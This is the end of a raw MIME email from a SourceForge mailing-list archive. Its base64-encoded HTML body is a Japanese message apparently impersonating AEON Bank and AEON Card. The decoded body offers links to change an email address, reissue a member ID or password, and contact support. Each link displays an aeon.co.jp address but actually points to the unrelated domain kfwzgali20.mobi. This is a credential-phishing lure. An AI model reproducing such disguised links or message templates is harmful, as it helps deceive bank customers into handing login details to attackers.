QlI+PEJSPuKWvOODoeODvOODq+OCouODieODrOOCueOBruWkieabtOOBr+OBk+OBoeOCiSANCjxC
Uj48QSANCmhyZWY9Imh0dHBzOi8va2Z3emdhbGkyMC5tb2JpIj5odHRwczovL3d3dy5hZW9uLmNv
LmpwL2FwcC9zZXR0aW5ncy9wcm9maWxlLzwvQT48QlI+PEJSPu+8ne+8ne+8ne+8ne+8ne+8ne+8
ne+8ne+8nTxCUj7ilqDjgqTjgqrjg7Pjgrnjgq/jgqjjgqLjg6Hjg7Pjg5Djg7xJROODu+ODkeOC
ueODr+ODvOODieOCkuOBiuW/mOOCjOOBruWgtOWQiDxCUj48RU0+PEEgDQpocmVmPSJodHRwczov
L2tmd3pnYWxpMjAubW9iaSI+aHR0cHM6Ly93d3cuYWVvbi5jby5qcC9hcHAvc2VhcmNoX2lkX3B3
X3JlaXNzdWUvPC9BPjwvRU0+PEJSPjxCUj7ilqDjgYrllY/jgYTlkIjjgo/jgZvlhYg8QlI+PEEg
DQpocmVmPSJodHRwczovL2tmd3pnYWxpMjAubW9iaSI+aHR0cHM6Ly93d3cuYWVvbi5jby5qcC9p
bnF1aXJ5LzwvQT48QlI+PEJSPu+8ne+8ne+8ne+8ne+8ne+8ne+8ne+8ne+8nTxCUj7jgZPjga7j
g6Hjg7zjg6vjgqLjg4njg6zjgrlbIA0Kc3RhdGVtZW50QGVtYWlsLmFlb24uY28uanAgDQpd44Gv
6YCB5L+h5bCC55So44Ki44OJ44Os44K544Gu44Gf44KB44CB44GU6L+U5L+h44GE44Gf44Gg44GE
44Gm44KC44GU55So5Lu244Gv5om/44KM44G+44Gb44KT44CCPEJSPuW9k+ODoeODvOODq+OBq+OB
iuW/g+W9k+OBn+OCiuOBruOBquOBhOaWueOBr+OAgeWkp+WkieOBiuaJi+aVsOOCkuOBiuaOm+OB
keOBhOOBn+OBl+OBvuOBmeOBjOOAgeOBneOBruaXqOOCkuOBiuabuOOBjea3u+OBiOOBhOOBn+OB
oOOBjeS4i+iomOOCouODieODrOOCueOBvuOBp+OBiumAgeOCiuOBj+OBoOOBleOBhOOAgjxCUj5u
ZXRicmFuY2hAYWVvbi5jby5qcDxCUj48QlI+4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBPEJS
PueZuuihjO+8muagquW8j+S8muekvuOCpOOCquODs+mKgOihjDxCUj5odHRwczovL3d3dy5hZW9u
YmFuay5jby5qcC88QlI+PEJSPualreWLmeWPl+iol+S8muekvu+8muOCpOOCquODs+ODleOCo+OD
iuODs+OCt+ODo+ODq+OCteODvOODk+OCueagquW8j+S8muekvjxCUj5odHRwczovL3d3dy5hZW9u
ZmluYW5jaWFsLmNvLmpwLzxCUj48QlI+44GT44Gu44Oh44O844Or44Gr5o6y6LyJ44GV44KM44Gf
5YaF5a6544KS6Kix5Y+v44Gq44GP6Lui6LyJ44GZ44KL44GT44Go44KS56aB44GY44G+44GZ44CC
PEJSPuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgTxCUj48L0JPRFk+PC9IVE1MPg0K

------=_NextPart_000_0F9E_014E2029.16550CE0--



--===============1381483886700269070==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1381483886700269070==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============1381483886700269070==--


